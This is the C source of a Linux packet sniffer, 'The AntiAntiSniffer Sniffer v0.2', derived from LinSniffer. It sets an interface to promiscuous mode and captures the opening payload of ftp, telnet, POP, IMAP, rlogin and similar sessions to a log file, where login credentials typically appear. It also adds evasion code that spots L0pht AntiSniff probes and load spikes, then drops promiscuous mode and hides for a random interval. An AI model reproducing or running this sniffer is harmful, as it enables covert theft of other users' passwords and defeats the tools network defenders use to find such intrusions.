/*
   The AntiAntiSniffer Sniffer v0.2 by Mike Perry

   To all my friends, coworkers, and associates who thought I knew better than
   to do something like this, please understand that when I discovered I could
   call the program the AntiAntiSniffer Sniffer, I just couldn't resist :)
   
   P.S. Legitimate tools such as icmplog will exhibit the same order of
   magnitude latency increase on ping responses.

   New to 0.2: I check eth frame's addresses for the magic value used by l0pht
   antisniff, as well as your ethaddr if ULTRA_PARANOID is set.

   Moral of the story: use ssh/lsh, and assume no host on your network is to
   be trusted under any means.

   P.S. Sorry to all my teachers. All the global varables must be killing you
   guys right now :)
   
   Based on:
   LinSniffer 0.03 [BETA]
   Mike Edulla
   medulla@infosoc.com

   As always, my portion of code falls under the GPL.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <linux/if.h>
#include <signal.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>

#define INTERFACE "eth0"

#ifndef ETH_ALEN
# define ETH_ALEN 	6
#endif

/* Really paranoid counts every packet in the load average. If the load
 * average jumps, we drop the promisc bit, and sleep for a few seconds */
#define REALLY_PARANOID	3

/* Paranoid only counts packets that we would log. If the load average of
 * these packers jump, we drop the promisc bit, and sleep for a few seconds */
#define PARANOID	2

/* Lazy simply negelcts from logging until our load normalizes.. If you are on
 * a (REAL) fast machine that is not slowed down by the kernel having to drop
 * packets as opposed to the interface, you may want this option (to avoid the 
 * HIDEOUT issue described below). All this will save you is the traversal 
 * through the list, and the write to disk.
 */
#define LAZY		1

#define AASS		REALLY_PARANOID

/* Average over X packets */
/* The higher the value, the fewer false positives.
 * However, if the NUM_PKTS is TOO large, we may get caught before we even 
 * accumulate enough packets for accurate statistics! See the HIDEOUT & 
 * comments for more info..
 */
#define NUM_PKTS_SHIFT 2
#define NUM_PKTS 8

/* 
 * Secs to wait for the bad men to go away :)
 */
#define HIDEOUT_MAX	20000000 /* 20 sec max */
#define HIDEOUT_MIN	5000000 /* 5 sec min */

#define randhide()	\
	((rand() % (HIDEOUT_MAX - HIDEOUT_MIN)) + HIDEOUT_MIN)

/* Use this to define your own maximum load at which to bail out */
/* Units are usecs per packet */
/* Careful! Your machine may drop packets at the kernel level (esp if you have
 * CPU_IS_TOO_SLOW set in networking options)
 * Fast machines may get alot of false positives for ftp however..
 */
#define UMAX_LOAD	0100 /* 0.4ms per packet. 0 is Inf */

/* This causes the algorithm to treat dead time as if a packet was coming
 * every BASELINE usecs. Useful for intermittent traffic networks */
#define BASELINE	4000 /* 4ms */
    
/* As a last resort, don't track more than CMAX connections at once. */
#define CMAX	10 /* -1 is Inf */

/* This option controls if we watch for the AntiSniff magic packets, in
 * addition to our own address (in case they are sending the ping before we
 * detected a change in load)
 * Note, this is a definable option because it is possible to use this against
 * us, and send these packets all the time just to shut us down */   
#define ANTIMAGIC

#ifdef  ANTIMAGIC
# define MAGIC1	"ff:00:00:00:00:00" /* Method #1 for Win* */
# define MAGIC2	"66:66:66:66:66:66" /* AntiSniff user specified */
# define MYADDR	"fe:ed:de:ad:be:ef" /* Undefine and decrement NMAGIC, and
				       change the hex_addrlist to not watch
				       for your address */
# define NMAGIC		3	    /* Number of magic eth addrs to search */
char *hex_addrlist[] = { MAGIC1, MAGIC2, MYADDR };
char h_dest[NMAGIC][ETH_ALEN];
#endif


#define CAPLEN 512
#define TIMEOUT 30
#define TCPLOG "test"

/* Actually, this debug option prints out some pretty useful stats you can use
 * to set UMAX_LOAD */
/*#define DEBUG */

#ifdef DEBUG
# define PRINTF(a...)  printf(##a)
#else
# define PRINTF(x...)
#endif


struct netload
{
    struct timeval last;
    int stats;
};

struct netload rawload;
struct netload tcpload;


/* #define RESOLVE_HOSTS Rule #2. */

struct etherpacket
{
    struct ethhdr eth;
    struct iphdr ip;
    struct tcphdr tcp;
    char buff[8192];
} ep;

struct vlist_t
{
    unsigned long saddr;
    unsigned long daddr;
    unsigned short sport;
    unsigned short dport;
    int bytes_read;
    time_t start_time;
    time_t last;
    char data[CAPLEN+1];
    struct vlist_t *next;
};


int ntraced = 0;
struct vlist_t vlist_head;
struct iphdr *ip;
struct tcphdr *tcp;
int s;
FILE *fp;

#ifdef ANTIMAGIC

# ifdef DEBUG
#  define PRINT_ETHER(a) print_ether(a)
# else 
#  define PRINT_ETHER(a)
# endif

void print_ether(char *addr)
{
    fprintf(fp,"Eth addr %2X:%2X:%2X:%2X:%2X:%2X\n",
	    addr[0] & 0xff, addr[1] & 0xff,
	    addr[2] & 0xff, addr[3] & 0xff,
	    addr[4] & 0xff, addr[5] & 0xff); 
    fflush(fp);
}

void init_magic()
{
    char *p;
    int j = 0, i;
    
    for(j = 0; j < NMAGIC; j++)
    {
	p = hex_addrlist[j];
	PRINTF("Blocking addr %s\n", p);
	for(i=0; i < ETH_ALEN && p && *p != 0; i++, p++)
	{
	    h_dest[j][i] = strtol(p, NULL, 16) & 0xff;
	    p = strchr(p, ':');
	}
	PRINT_ETHER(h_dest[j]);
    }
}

int ismagic()
{
    register int i;

    PRINT_ETHER(ep.eth.h_dest);

    for(i = 0; i < NMAGIC; i++)
    {
	if(!memcmp(ep.eth.h_dest, h_dest[i], ETH_ALEN))
	{
	    return 1;
	} 
    }
    return 0;
}
#endif
void set_promisc(char *dev, int s)
{
    struct ifreq ifr;
   
    strcpy(ifr.ifr_name, dev);
    
    fprintf(fp, "Interface %s online\n", dev);
    
    if(ioctl(s, SIOCGIFFLAGS, &ifr) < 0)
    {
	close(s);
	perror("Can't get promisc bit!");
	exit(0);
    }
    ifr.ifr_flags |= IFF_PROMISC;
    if(ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
    {
	perror("Can't set promisc bit!");
	exit(0);
    }
    fflush(fp);	
}

void drop_promisc(char *dev, int s)
{
    struct ifreq ifr;
   
    strcpy(ifr.ifr_name, dev);

    fprintf(fp, "AntiSniff detected. Dropping promisc from interface %s\n", dev);
    
    if(ioctl(s, SIOCGIFFLAGS, &ifr) < 0)
    {
	close(s);
	perror("Can't drop promisc bit! Bailing");
	exit(0);
    }
    ifr.ifr_flags &= ~IFF_PROMISC;
    if(ioctl(s, SIOCSIFFLAGS, &ifr) < 0)
    {
	perror("Can't drop promisc bit! Bailing");
	exit(0);
    }	
}

void closeintf(char *dev, int s)
{
    /* We must completly flush our data, unfortunately */
    drop_promisc(dev, s);
    shutdown(s, 2);
    close(s);
}

int openintf(char *dev)
{
    int fd;
    fd = socket(PF_PACKET, SOCK_PACKET, htons(0x800));
    if (fd < 0)
    {
	perror("cant get SOCK_PACKET socket");
	exit(0);
    }
    set_promisc(dev, fd);
    return fd;
}


void init_load(struct netload *load)
{
    gettimeofday(&load->last, NULL);
    load->stats = BASELINE;
}


/*
 * The algorithm is as follows:
 *
 * Say you have N numbers coming in
 * You don't want to make an array to hold them all in to average
 * So you do this: avg = (N*avg + number)/N
 * That reduces to avg = avg + number/N or avg += number/N
 *
 * But we have no idea how many packets will come in, So what happens if you 
 * get past N? Why you have to subtract avg/N off so you don't just head on off
 * to +Infinity
 *
 * Example with real numbers: 
 * So if the time difference were 12 each time, after 8 packets the avg would be up 
 * to 12, so we add the new one (12/8) then subtract avg/8 (12/8) to stabalize.
 * 
 * Lower stats mean more load. (Units of usecs/packet)
 */
int account_load(struct netload *load)
{
    struct timeval tv;
    register int elapsed;
    gettimeofday(&tv, NULL);
    
    PRINTF("%d sec, %6d usec elapsed\t", tv.tv_sec - load->last.tv_sec,
	    tv.tv_usec - load->last.tv_usec);

    /* Make things a little more normalized for very low traffic networks */
    /* essentially we are simulating a packet every 5 msec */
    if(tv.tv_sec > load->last.tv_sec || tv.tv_usec - load->last.tv_usec >
	    BASELINE)
	elapsed = BASELINE;
    else
	elapsed = tv.tv_usec - load->last.tv_usec;
    load->last = tv;

#if defined(READABLE) 
    load->stats += elapsed / NUM_PKTS - load->stats / NUM_PKTS;
#else
    load->stats += (elapsed - load->stats) >> NUM_PKTS_SHIFT;
#endif

    PRINTF("Stats %6d\tDelta stats %d\n", load->stats, (elapsed - load->stats) >>
	    NUM_PKTS_SHIFT);
    /*  Remember, lower stat means higher load */
    if(load->stats < UMAX_LOAD)
    {
	PRINTF("Threshold exceeded. Network load %d\n", load->stats);
	load->stats = BASELINE;
	return AASS;
    }
    return 0;
}

int drop(void)
{
    if (ip->protocol != 6)
	return 1;

    switch (ntohs(tcp->dest))
    {
    case 21:			/* ftp */
    case 23:			/* telnet */
    case 110:			/* pop3 */
    case 109:			/* pop2 */
    case 143:			/* imap2 */
    case 513:			/* rlogin */
    case 106:			/* poppasswd */
    case 761:			/* kerberos passwd */
    case 87:			/* tty link */
    case 6666:			/* Hrmm.. Who IRC's? :) */
    case 6667:
#if AASS == LAZY
	return account_load(&tcpload);
#else if AASS == PARANOID
	if(account_load(&tcpload))
	{
	    closeintf(INTERFACE, s);
	    usleep(randhide());
	    openintf(INTERFACE);
	}
#endif
	return 0;
    default:
	return 1;
    }
}


void read_tcp(int s)
{
    while (1)
    {
	if(read(s, (struct etherpacket *) &ep, sizeof(ep)) > 1)
	{
#ifdef ANTIMAGIC
	    if(ismagic())
	    {
		closeintf(INTERFACE,s);
		usleep(randhide());
		openintf(INTERFACE);
	    }
#endif
#if AASS == REALLY_PARANOID
	    if(account_load(&rawload))
	    {
		closeintf(INTERFACE,s);
		usleep(randhide());
		openintf(INTERFACE);
	    }
#endif
	    if(!drop())
		return;
	}
    }
}

char *hostlookup(unsigned long int in)
{
    struct in_addr i;
#ifdef RESOLVE_HOSTS
    static char blah[1024];
    struct hostent *he;

    i.s_addr = in;
    he = gethostbyaddr((char *) &i, sizeof(struct in_addr), AF_INET);
    if (he == NULL)
	strcpy(blah, inet_ntoa(i));
    else
	strcpy(blah, he->h_name);
    return blah;
#endif
    i.s_addr = in;
    return inet_ntoa(i);
}


int print_header(void)
{
    fprintf(fp, "\n---------------\n");
    fprintf(fp, "%s => ", hostlookup(ip->saddr));
    fprintf(fp, "%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest));
}

void cleanup(int sig)
{
    fprintf(fp, "Exiting...\n");
    close(s);
    fclose(fp);
    exit(0);
}

void log_packet(struct vlist_t *v, char *type)
{
    int i = 0;
    int t = 0;

    for (i = 0; i != v->bytes_read; i++)
    {
	if (v->data[i] == 13)
	{
	    fprintf(fp, "\n");
	    t = 0;
	}
	if (isprint(v->data[i]))
	{
	    fprintf(fp, "%c", v->data[i]);
	    t++;
	}
	if (t > 75)
	{
	    t = 0;
	    fprintf(fp, "\n");
	}
    }
    fprintf(fp, "\n[%s]---------------\n", type);
}


void enque_victim()
{
    struct vlist_t *p;
    ntraced++;
    if(ntraced >= CMAX)
    {
	closeintf(INTERFACE, s);
	usleep(randhide());
	openintf(INTERFACE);
    }
    for(p = &vlist_head; p->next != NULL; p = p->next)
	;
    p->next = (struct vlist_t *)malloc(sizeof(struct vlist_t));
    p = p->next;
    p->saddr = ip->saddr;
    p->daddr = ip->daddr;
    p->dport = tcp->dest;
    p->sport = tcp->source;
    p->bytes_read = 0;
    p->start_time = p->last = time(NULL);
    p->next = NULL;
}

void seek_and_destroy()
{
    struct vlist_t *p, *prev;
    for(p = &vlist_head; p->next != NULL; )
    {
	prev = p;
	p = p->next;
	if(p->saddr == ip->saddr && p->daddr == ip->daddr && 
		p->sport == tcp->source && p->dport == tcp->dest)
	{
	    log_packet(p, "FIN/RST");
	    p = p->next;
	    free(prev->next);
	    prev->next = p;
	    ntraced--;
	    return;
	}
    }
} 

void prune_list()
{
    struct vlist_t *p, *prev;
    for(p = &vlist_head; p && p->next != NULL; )
    {
	prev = p;
	p = p->next;
	if(time(NULL) - p->last > TIMEOUT || p->bytes_read > CAPLEN)
	{
	    log_packet(p, "CAPLEN");
	    p = p->next;
	    free(prev->next);
	    prev->next = p;
	    ntraced--;
	}
    }
}  

void snarf_data()
{
    struct vlist_t *p;
    int bytes = htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp);
    for(p = &vlist_head; p->next != NULL; )
    {
	p = p->next;
	if(p->saddr == ip->saddr && p->daddr == ip->daddr && 
		p->sport == tcp->source && p->dport == tcp->dest)
	{
	    if(p->bytes_read + bytes >= CAPLEN)
	    {
		bytes = CAPLEN - p->bytes_read;
	    }
	    memcpy(p->data + p->bytes_read, ep.buff-2, bytes); 
	    p->bytes_read += bytes;
	    return;
	}
    }
}


void manage_list()
{
    if(tcp->syn == 1)
    {
	enque_victim();
	print_header();
    }
    else if (tcp->rst == 1 || tcp->fin == 1)
    {
	seek_and_destroy();
	return;
    }
    snarf_data();
}

int main(int argc, char **argv)
{
    struct timeval tv;
    ip = (struct iphdr *) (((unsigned long) &ep.ip) - 2);
    tcp = (struct tcphdr *) (((unsigned long) &ep.tcp) - 2);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, cleanup);
    signal(SIGTERM, cleanup);
    signal(SIGKILL, cleanup);
    signal(SIGQUIT, cleanup);
    fp = fopen(TCPLOG, "at");
    gettimeofday(&tv, NULL);
    srand(tv.tv_usec ^ getpid() ^ (getppid() << 16));

#if 0
    if(fork())
    {
	exit(0);
    }
#endif
    if (fp == NULL)
    {
	fprintf(stderr, "cant open log\n");
	exit(0);
    }

    vlist_head.next = NULL;
#ifdef ANTIMAGIC
    init_magic();
#endif
    init_load(&tcpload);
    init_load(&rawload);
    s = openintf(INTERFACE);
    for (;;)
    {
	read_tcp(s);
	manage_list();
	/* I think using sigalarms is what made linsniff666 unstable, so I am
	 * just going to prune the timed out connects after a valid packet
	 * comes through */
	prune_list();
	fflush(fp);
    }
    return 1;
}
